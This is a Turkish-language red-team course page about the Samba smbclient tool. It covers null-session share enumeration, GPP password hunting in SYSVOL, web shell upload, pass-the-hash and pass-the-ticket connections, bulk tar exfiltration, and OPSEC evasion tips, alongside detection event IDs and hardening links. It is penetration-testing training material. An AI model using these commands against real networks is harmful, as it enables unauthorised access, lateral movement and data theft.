# smbclient

> **Kategori:** [1. TEMEL İSTEMCİLER VE AĞ PROTOKOL ARAÇLARI (NATIVE CLIENTS & UTILITIES)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Samba CLI istemcisi; SMB paylaşımlarında gezinme, dosya indirme/yükleme, recursive transfer, null/guest session.

---

## 1. Genel Bakış ve Amaç

`smbclient`, Samba projesinin parçası olan bir komut satırı aracıdır ve Windows ortamlarındaki SMB/CIFS (Server Message Block / Common Internet File System) paylaşımlarına Linux'tan erişmeyi sağlar. Bir Active Directory keşif operasyonunda **ilk temas aracı** olarak kritik rol oynar: hedef makinedeki paylaşımları listelemek, dosya indirmek/yüklemek ve null session üzerinden anonim erişim denemek için kullanılır.

### Protokol ve Çalışma Prensibi

`smbclient`, SMB protokolünün tüm sürümlerini (SMBv1/SMBv2/SMBv3) destekler. Bağlantı kurulumu şu adımlarla gerçekleşir:

```
┌──────────┐     TCP 445      ┌──────────┐
│ smbclient│ ───────────────► │  Hedef   │
│ (Linux)  │  SMB Negotiate   │ (DC/Srv) │
│          │ ◄─────────────── │          │
│          │  Session Setup   │          │
│          │  (NTLM/Kerberos) │          │
│          │ ───────────────► │          │
│          │  Tree Connect    │          │
│          │  (\\srv\share)   │          │
│          │ ───────────────► │          │
└──────────┘                  └──────────┘
```

1. **SMB Negotiate** — İstemci ve sunucu desteklenen dialect'ı (SMB2.0.2, SMB3.1.1 vb.) ve şifreleme yeteneklerini belirler.
2. **Session Setup** — Kimlik doğrulama gerçekleşir. NTLMSSP (parola/hash) veya Kerberos (TGT/TGS bileti) kullanılır.
3. **Tree Connect** — Belirtilen paylaşıma (`\\sunucu\paylaşım`) bağlantı kurulur.
4. **SMB Commands** — Dosya okuma/yazma/listeleme işlemleri yapılır.

**Kullanılan Portlar:**
- **TCP 445** — Doğrudan SMB (modern, varsayılan)
- **TCP 139** — NetBIOS Session Service üzerinden SMB (eski, NBT desteği gerektirir)

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **Null Session Keşfi** | Kimlik doğrulama olmadan paylaşım listesi ve erişim denetimi |
| **Hassas Dosya Arama** | Paylaşımlarda parola dosyaları, script'ler, yedekler aranır |
| **Veri Sızdırma (Exfiltration)** | Toparlanan bilgiler bir paylaşıma yüklenebilir |
| **GPP Parola Tespiti** | `SYSVOL` üzerindeki `Groups.xml` gibi GPP dosyaları çekilir |
| **İlk Ayak İzi (Foothold)** | Yazılabilir paylaşıma web shell veya payload yükleme |

> **Alternatifler:** [smbmap](./smbmap.md) (izin taraması), [impacket-smbclient](./impacket-smbclient.md) (PTH/Kerberos), [mount.cifs](./mount.cifs.md) (dosya sistemi bağlama)

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```bash
smbclient [//sunucu/paylaşım] [parola] [seçenekler]
# veya paylaşım listeleme:
smbclient -L //sunucu [seçenekler]
```

### Kritik Parametreler

| Parametre | Açıklama | Örnek |
|---|---|---|
| `-L`, `--list` | Hedefteki paylaşımları listeler | `-L //DC01` |
| `-U` | Kullanıcı adı belirtir (`DOMAIN\user` veya `user%password`) | `-U 'CORP\svc_backup%P@ss123'` |
| `-N` | Parola sorma — null session için | `-N` |
| `-W` | Çalışma grubu / domain adı | `-W CORP` |
| `-I` | Hedef IP adresini belirtir (DNS bypass) | `-I 10.10.10.100` |
| `-p` | Hedef port (varsayılan 445) | `-p 139` |
| `-m` | Maksimum SMB protokol sürümü | `-m SMB3` |
| `--min-protocol` | Minimum SMB protokol sürümü | `--min-protocol SMB2` |
| `-c` | Komutları interaktif olmadan çalıştırır | `-c 'ls;exit'` |
| `-A` | Kimlik dosyasından okuma | `-A /root/.smbcreds` |
| `-k` | Kerberos kimlik doğrulama kullan (ccache) | `-k` |
| `--use-krb5-ccache` | Belirli bir ccache dosyası belirt | `--use-krb5-ccache /tmp/krb5cc_0` |
| `-D` | Başlangıç dizini belirt | `-D 'Scripts'` |
| `-T`, `--tar` | Tar arşivi oluştur/çıkar | `-Tc backup.tar *` |
| `--option` | smb.conf parametresi geçir | `--option='client min protocol=SMB2'` |
| `-g`, `--grepable` | Grep yapılabilir çıktı formatı | `-g` |
| `-d` | Debug seviyesi (0-10) | `-d 3` |

### İnteraktif Kabuk Komutları

`smbclient` ile bir paylaşıma bağlandığınızda FTP benzeri bir interaktif kabuk açılır:

| Komut | Açıklama |
|---|---|
| `ls` / `dir` | Dizin listele |
| `cd <dizin>` | Dizin değiştir |
| `get <dosya>` | Tek dosya indir |
| `put <dosya>` | Tek dosya yükle |
| `mget <pattern>` | Birden fazla dosya indir (wildcard) |
| `mput <pattern>` | Birden fazla dosya yükle |
| `prompt off` | mget/mput onay istemini kapat |
| `recurse on` | Alt dizinlere de in |
| `allinfo <dosya>` | Dosya meta verisi (ACL, zaman damgası) |
| `showacls` | ACL gösterimini aç |
| `del <dosya>` | Dosya sil |
| `mkdir <dizin>` | Dizin oluştur |
| `rmdir <dizin>` | Dizin sil |
| `logon <user> <pass>` | Oturum değiştir |
| `exit` / `quit` | Çıkış |

---

## 3. Pratik Komut Örnekleri

### 3.1 Paylaşım Listeleme

#### Null Session (Anonim)

```bash
# Null session ile paylaşım listele
smbclient -L //10.10.10.100 -N

# Çıktı:
#   Sharename       Type      Comment
#   ---------       ----      -------
#   ADMIN$          Disk      Remote Admin
#   C$              Disk      Default share
#   IPC$            IPC       Remote IPC
#   NETLOGON        Disk      Logon server share
#   SYSVOL          Disk      Logon server share
#   Backup          Disk      IT Backup Share
```

#### Kimlik Doğrulamalı Listeleme

```bash
# Domain kullanıcısı ile
smbclient -L //DC01.corp.local -U 'CORP\j.doe%Summer2024!'

# Parola ayrı sorulsun
smbclient -L //DC01.corp.local -U 'CORP\j.doe'
```

### 3.2 Paylaşıma Bağlanma ve Dosya İşlemleri

```bash
# Backup paylaşımına bağlan
smbclient //10.10.10.100/Backup -U 'CORP\j.doe%Summer2024!'

# İnteraktif kabukta:
smb: \> ls
smb: \> cd IT
smb: \> get passwords.xlsx
smb: \> exit
```

### 3.3 Recursive Dosya İndirme (Tüm Paylaşımı Çekme)

```bash
# Paylaşımdaki her şeyi yerel dizine indir
smbclient //DC01.corp.local/SYSVOL -U 'CORP\j.doe%Summer2024!' \
  -c 'prompt off; recurse on; mget *'

# Tek satır — belirli bir alt dizini indir
smbclient //DC01.corp.local/SYSVOL -U 'CORP\j.doe%Summer2024!' \
  -D 'corp.local/Policies' -c 'prompt off; recurse on; mget *'
```

### 3.4 GPP Parola Avcılığı (SYSVOL'den Groups.xml)

```bash
# SYSVOL'deki GPP XML dosyalarını çek
smbclient //DC01.corp.local/SYSVOL -U 'CORP\j.doe%Summer2024!' \
  -c 'prompt off; recurse on; mget *.xml'

# Ardından cpassword alanını decode et
# (MS14-025 yaması öncesi ortamlarda geçerli)
grep -r 'cpassword' *.xml
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+..."
```

### 3.5 Null Session ile IPC$ Üzerinden Bilgi Toplama

```bash
# IPC$ üzerinden null session — RPC çağrıları için temel
smbclient //10.10.10.100/IPC$ -N

# Genellikle doğrudan dosya işlemi yapılamaz ama
# RPC bağlantıları (rpcclient) için zemin hazırlar
```

### 3.6 Dosya Yükleme (Payload / Web Shell)

```bash
# Yazılabilir paylaşıma dosya yükle
smbclient //SRV01.corp.local/wwwroot -U 'CORP\svc_web%P@ss123' \
  -c 'put /tmp/cmd.aspx cmd.aspx'

# Birden çok dosya yükle
smbclient //SRV01.corp.local/Data -U 'CORP\j.doe%Summer2024!' \
  -c 'prompt off; mput *.txt'
```

### 3.7 Kerberos Kimlik Doğrulama (Pass-the-Ticket)

```bash
# Önce Kerberos bileti al veya mevcut ccache'i ayarla
export KRB5CCNAME=/tmp/krb5cc_svc_backup

# Kerberos ile bağlan — parola gerekmez
smbclient //DC01.corp.local/C$ -k -N

# veya ccache dosyasını açıkça belirt
smbclient //DC01.corp.local/ADMIN$ --use-krb5-ccache=/tmp/krb5cc_svc_backup
```

> ⚠️ **Önemli:** Kerberos kullanırken hedefi **IP yerine FQDN** ile belirtmelisiniz. Kerberos, SPN eşleştirmesini hostname üzerinden yapar; IP kullanılırsa `KRB5KRB_AP_ERR_NOT_US` hatası alırsınız.

### 3.8 NTLM Hash ile Bağlanma (Pass-the-Hash)

`smbclient` doğrudan NTLM hash ile PTH destekler:

```bash
# --pw-nt-hash bayrağı ile NT hash geçir
smbclient //DC01.corp.local/C$ -U 'CORP\Administrator%aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' \
  --pw-nt-hash

# Kısaltılmış (sadece NT hash):
smbclient //DC01.corp.local/C$ -U 'Administrator' \
  --pw-nt-hash -W CORP \
  --password='32ed87bdb5fdc5e9cba88547376818d4'
```

### 3.9 Tar Arşivi ile Toplu Yedekleme

```bash
# Paylaşımın tamamını tar olarak indir
smbclient //SRV01.corp.local/Finance -U 'CORP\j.doe%Summer2024!' \
  -Tc /tmp/finance_backup.tar '*'

# Belirli uzantıları dahil et
smbclient //SRV01.corp.local/Finance -U 'CORP\j.doe%Summer2024!' \
  -Tc /tmp/docs.tar '*.docx' '*.xlsx' '*.pdf'
```

### 3.10 Non-İnteraktif Komut Zinciri (`-c` ile Scripting)

```bash
# Tek satırda: bağlan → dizin değiştir → dosya indir → çık
smbclient //DC01.corp.local/NETLOGON -U 'CORP\j.doe%Summer2024!' \
  -c 'cd scripts; ls; get logon.bat; exit'

# Birden fazla paylaşımı taramak için bash döngüsü
for share in SYSVOL NETLOGON Backup Data; do
  echo "=== $share ==="
  smbclient //DC01.corp.local/$share -U 'CORP\j.doe%Summer2024!' \
    -c 'recurse on; ls' 2>/dev/null
done
```

### 3.11 SMB Signing Kontrolü

```bash
# SMB signing zorunlu mu kontrol et (debug çıktısında görünür)
smbclient -L //DC01.corp.local -N -d 3 2>&1 | grep -i signing

# Çıktı örneği:
#   signing_good:   signing on 2 connections
#   SMB signing is required
```

> SMB signing kapalıysa NTLM relay saldırılarına zemin hazırlar — bkz. [Red M08 — Koersiyon ve NTLM Relay](../../Modul_08_Koersiyon_ve_NTLM_Relay/)

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Neden | Çözüm |
|---|---|---|
| `NT_STATUS_ACCESS_DENIED` | Yetersiz yetki veya yanlış kimlik bilgisi | Kullanıcı adı/parola doğrula; domain prefix'i (`CORP\`) kontrol et |
| `NT_STATUS_LOGON_FAILURE` | Hatalı parola veya kilitlenmiş hesap | Hesap kilit durumunu kontrol et; parola doğruluğunu başka araçla test et |
| `NT_STATUS_BAD_NETWORK_NAME` | Paylaşım adı yanlış veya mevcut değil | `-L` ile paylaşım listesi al; büyük/küçük harf duyarlılığına dikkat |
| `NT_STATUS_CONNECTION_REFUSED` | SMB servisi çalışmıyor veya firewall | `nmap -p 445 <hedef>` ile port kontrolü yap |
| `NT_STATUS_IO_TIMEOUT` | Ağ zaman aşımı | Firewall kurallarını kontrol et; `-I <IP>` ile doğrudan bağlan |
| `protocol negotiation failed: NT_STATUS_CONNECTION_RESET` | SMBv1 devre dışı, istemci SMBv1 deniyor | `--min-protocol SMB2` veya `-m SMB3` ekle |
| `NT_STATUS_ACCOUNT_DISABLED` | Hesap devre dışı | Farklı hesap kullan |
| `NT_STATUS_PASSWORD_MUST_CHANGE` | Parola süresi dolmuş | `smbpasswd` veya RPC ile parolayı değiştir |
| `session setup failed: NT_STATUS_NOT_SUPPORTED` | NTLM devre dışı bırakılmış | Kerberos (`-k`) ile dene |
| `gensec_update: NT_STATUS_UNSUCCESSFUL` | Kerberos SPN eşleşmedi (IP kullanılmış) | IP yerine FQDN kullan; `/etc/krb5.conf` ve DNS ayarlarını kontrol et |
| `tree connect failed: NT_STATUS_DUPLICATE_NAME` | NetBIOS ad çakışması | `-I <IP>` ile bağlan; NetBIOS adı yerine IP kullan |

### smb.conf İnce Ayar

`smbclient` davranışı `/etc/samba/smb.conf` veya `--option` ile değiştirilebilir:

```bash
# SMBv1'i zorla devre dışı bırak (güvenlik)
smbclient //DC01/SYSVOL -U user --option='client min protocol=SMB2'

# NTLMv1'i engelle (yalnızca NTLMv2)
smbclient //DC01/SYSVOL -U user --option='client ntlmv2 auth=yes' \
  --option='client lanman auth=no' --option='client plaintext auth=no'

# Kerberos şifreleme tipi ayarla
smbclient //DC01/C$ -k --option='kerberos encryption types=aes256-cts-hmac-sha1-96'
```

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler

| Kaynak | Event ID / Log | Detay |
|---|---|---|
| **Windows Security Log** | **4624** (Logon Type 3) | Network logon — her SMB bağlantısında üretilir |
| **Windows Security Log** | **4625** (Logon Failure) | Başarısız giriş — null session veya yanlış kimlik |
| **Windows Security Log** | **5140** | Paylaşıma erişim (share access) |
| **Windows Security Log** | **5145** | Dosya/klasör erişim detayı (object access) |
| **Windows Security Log** | **4776** | NTLM kimlik doğrulama (DC'de) |
| **Windows Security Log** | **4768 / 4769** | Kerberos TGT/TGS isteği (Kerberos auth kullanıldığında) |
| **Sysmon** | **Event ID 3** | Ağ bağlantısı (TCP 445) |

### 5.2 Ağ İmzaları

- **User-Agent:** `smbclient` öntanımlı olarak SMB negotiate'te `Samba x.x.x` client string'i gönderir — IDS/NDR (Network Detection & Response) tarafından tespit edilebilir.
- **SMB Dialect:** SMBv1 negotiate denemesi modern ortamlarda anomali olarak işaretlenir.
- **Null Session:** Boş kullanıcı + boş parola ile Session Setup anomali olarak loglanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | smbclient Kullanımı |
|---|---|---|
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | Paylaşımlara bağlanma (`C$`, `ADMIN$`) |
| **T1135** | Network Share Discovery | `-L` ile paylaşım listeleme |
| **T1039** | Data from Network Shared Drive | Paylaşımlardan dosya indirme |
| **T1570** | Lateral Tool Transfer | Payload / araç yükleme |
| **T1187** | Forced Authentication | SMB bağlantısı ile hash yakalama senaryolarında |

### 5.4 OPSEC Önerileri

| Risk | Önlem |
|---|---|
| **Null session denemesi loglanır** | Mümkünse geçerli kimlik bilgisi kullan; null session yalnızca ilk keşifte dene |
| **Samba user-agent tespiti** | Hedef ortamda Windows istemcisi olarak görünmek için `impacket-smbclient` tercih et |
| **Yoğun dosya transferi anomalisi** | Büyük indirmeleri iş saatlerine yay; tek seferde tüm paylaşımı çekme |
| **Kilitlenme (lockout) riski** | `-N` ile null session denerken hesap kilitleme politikasına dikkat; birden fazla yanlış parola deneme |
| **NTLM hash'i ağda** | SMBv3 + şifreleme (`-m SMB3`) kullan; NTLM yerine Kerberos (`-k`) tercih et |
| **Lateral movement izi** | `C$` / `ADMIN$` erişimi yüksek alarmlıdır; mümkünse özel paylaşımlar üzerinden çalış |

### 5.5 Savunma Karşılığı (Blue Team Linki)

- SMB loglaması ve tespit kuralları → [Blue M01 — Görünürlük ve Log Yönetimi](../../../2-Blue_Team/Modul_01_Gorunurluk_ve_Log_Yonetimi/)
- SMB Signing zorunlu kılma → [Blue M08 — Protokol Sertleştirme ve Relay Önleme](../../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/)
- Null session engelleme → `RestrictAnonymous=2` GPO ayarı (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`)
- Paylaşım erişim denetimi → Event ID **5140/5145** ile SIEM korelasyonu

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

Aşağıdaki liste, sızma testlerinde ve kırmızı takım operasyonlarında en sık kullanılan `smbclient` komutlarını, kullanım amaçlarını ve parametre analizlerini bir araya getirir:

### 6.1 Anonim (Null Session) Paylaşım Listeleme
```bash
smbclient -N -L //192.168.1.10
```
- **Ne Yapar?** Parola sormadan (`-N`), hedef sunucu üzerindeki tüm erişilebilir SMB paylaşımlarını listeler (`-L`).
- **Ne Zaman Kullanılır?** İç ağda ayak basılan ilk anda (ilk temas / foothold), anonim veya misafir (guest) erişimine açık paylaşımları keşfetmek için.
- **Parametreler:** `-N` (No-pass: parola sormayı kapatır), `-L` (List: paylaşımları listeler).

### 6.2 Etki Alanı Kimliği ile Yetkili Paylaşımları Listeleme
```bash
smbclient -U 'LAB\j.doe%Password123!' -L //192.168.1.10
```
- **Ne Yapar?** Belirtilen etki alanı kullanıcısının yetkileriyle oturum açarak kullanıcının görebildiği tüm paylaşımları listeler.
- **Ne Zaman Kullanılır?** Standart bir etki alanı kullanıcısı ele geçirildiğinde, hangi dosya sunucularına veya gizli paylaşımlara erişim yetkisi olduğunu görmek için.
- **Parametreler:** `-U` (User: `DOMAIN\kullanıcı%parola` formatında tek satırda kimlik bilgisi iletir).

### 6.3 Belirli Bir Paylaşıma Doğrudan İnteraktif Bağlanma
```bash
smbclient -U 'LAB\j.doe%Password123!' //192.168.1.10/Ortak
```
- **Ne Yapar?** `Ortak` isimli paylaşıma FTP benzeri interaktif bir komut kabuğu (`smb: \>`) açar.
- **Ne Zaman Kullanılır?** Paylaşım içindeki dosyaları listelemek (`dir`), klasör değiştirmek (`cd`) ve dosya transferi yapmak için.

### 6.4 Pass-the-Hash (NTLM Hash) ile Yönetici Paylaşımına (C$) Bağlanma
```bash
smbclient -U 'LAB\Administrator' --pw-nt-hash //192.168.1.10/C$ 31d6cfe0d16ae931b73c59d7e0c089c0
```
- **Ne Yapar?** Düz metin parola yerine NT hash'i kullanarak hedef makinenin doğrudan C$ kök sürücüsüne bağlanır.
- **Ne Zaman Kullanılır?** Bellekten (LSASS) veya SAM veritabanından NTLM hash ele geçirildiğinde, parolayı kırmaya gerek kalmadan yetkili erişim sağlamak için.
- **Parametreler:** `--pw-nt-hash` (Samba'nın yerleşik NT hash desteği; 32 karakterlik NT hash alır).

### 6.5 Kerberos Bileti (TGT/TGS - ccache) ile Parolasız Bağlantı
```bash
export KRB5CCNAME=/tmp/administrator.ccache
smbclient -k -no-pass //dc01.lab.local/SYSVOL
```
- **Ne Yapar?** Linux ortamındaki Kerberos bilet önbelleğini (`KRB5CCNAME`) kullanarak hedef makineye bilet ile kimlik doğrular.
- **Ne Zaman Kullanılır?** Golden/Silver Ticket üretildiğinde veya bilet ele geçirildiğinde, NTLM trafiği oluşturmadan (OPSEC dostu) etki alanı kaynaklarına bağlanmak için.
- **Parametreler:** `-k` (Kerberos kimlik doğrulamasını zorlar), `-no-pass` (Parola sormayı kapatır), Hedef **FQDN** olmalıdır.

### 6.6 İnteraktif Olmadan Tek Satırda Uzaktan Dosya İndirme (Non-Interactive Get)
```bash
smbclient -U 'LAB\j.doe%Password123!' //192.168.1.10/Yedekler -c 'get secret_backup.kdbx /tmp/secret_backup.kdbx; exit'
```
- **Ne Yapar?** İnteraktif kabuk açmadan (`-c`), doğrudan uzaktaki belirtilen dosyayı yerel diske indirir ve oturumu sonlandırır.
- **Ne Zaman Kullanılır?** Otomasyon scriptlerinde, hızlı veri sızdırmada veya tek bir kritik konfigürasyon dosyasını anında çekmek için.
- **Parametreler:** `-c` (Çalıştırılacak SMB kabuk komut dizisi).

### 6.7 Tüm Paylaşımı Rekürsif Olarak Yerel Arşive İndirme (Tar Yedekleme Modu)
```bash
smbclient -U 'LAB\j.doe%Password123!' //192.168.1.10/Muhasebe -Tc muhasebe_arsiv.tar
```
- **Ne Yapar?** Paylaşımdaki tüm klasör ve dosyaları SMB üzerinden yerel bir `.tar` arşivi olarak paketleyip tek parça halinde indirir.
- **Ne Zaman Kullanılır?** Yüzlerce alt klasör ve dosya barındıran hassas paylaşımları tek tek indirmek yerine tek seferde eksiksiz sızdırmak için.
- **Parametreler:** `-T` (Tar modu), `c` (Create: yeni arşiv oluştur).

### 6.8 Kabuk İçinde Rekürsif ve Onaysız Çoklu Dosya İndirme
```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *.docx *.xlsx *.pdf *.kdbx
```
- **Ne Yapar?** Alt dizin taramasını açar (`recurse on`), her dosya için "indirilsin mi?" onayını susturur (`prompt off`) ve eşleşen tüm dosyaları topluca indirir.
- **Ne Zaman Kullanılır?** İnteraktif oturumda paylaşımdaki kritik uzantılı verileri toplu çekmek için.

### 6.9 SMBv3 ve Uçtan Uca Şifreleme (Encryption) Zorlama
```bash
smbclient -U 'LAB\j.doe%Password123!' //192.168.1.10/Gizli -m SMB3 -e
```
- **Ne Yapar?** SMBv3 protokolünü zorlar ve oturum içi tüm veri trafiğini AES ile şifreler (`-e`).
- **Ne Zaman Kullanılır?** Ağda IDS/IPS cihazlarının SMB yükünü incelemesini engellemek ve şifreleme zorunlu sunuculara bağlanmak için.
- **Parametreler:** `-m SMB3` (Maksimum dialect olarak SMBv3 seçer), `-e` (SMB paket şifrelemesini aktif eder).

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Samba smbclient man page | `man smbclient` / [samba.org](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) |
| MS-SMB2 Protokol Spesifikasyonu | [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/) |
| MITRE ATT&CK T1021.002 | [attack.mitre.org](https://attack.mitre.org/techniques/T1021/002/) |
| MITRE ATT&CK T1135 | [attack.mitre.org](https://attack.mitre.org/techniques/T1135/) |
| HackTricks — SMB Pentesting | [book.hacktricks.wiki](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html) |

---

> **Sonraki Araç:** [smbmap →](./smbmap.md)

